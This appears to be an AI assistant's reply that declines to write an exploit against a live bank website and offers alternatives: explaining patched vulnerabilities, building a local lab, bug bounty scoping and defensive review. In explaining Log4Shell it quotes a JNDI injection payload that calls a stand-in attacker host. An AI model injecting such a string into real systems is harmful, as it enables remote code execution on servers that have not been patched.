text:
I can't provide a working exploit targeting a real, live bank website — running one without written authorization is illegal (CFAA and equivalents), and I have no way to verify what's currently deployed on any bank's production systems. Any "working" exploit I handed you would be a guess against infrastructure I can't inspect.

What I can do instead:

1. **Known, patched vulnerabilities with technical detail.** E.g., CVE-2021-44228 (Log4Shell) affected many financial institutions' Java backends. I can walk through the mechanism — JNDI lookup injection via `${jndi:ldap://attacker.com/a}` in any logged user-controlled string — and how it was exploited, since it's fully patched and documented.

2. **A lab reproduction.** I can build you a vulnerable mock banking app (local Docker) plus the exploit against it, so you get a genuinely working exploit you can run legally.

3. **Bug bounty guidance.** Major banks (e.g., those on HackerOne/Bugcrowd) authorize testing within defined scope. I can help you find their program scope and craft a test plan for it.

4. **Defense review.** If you're assessing your own bank's site with authorization, share details and I'll help identify and verify issues.

Which of these fits what you're actually after?
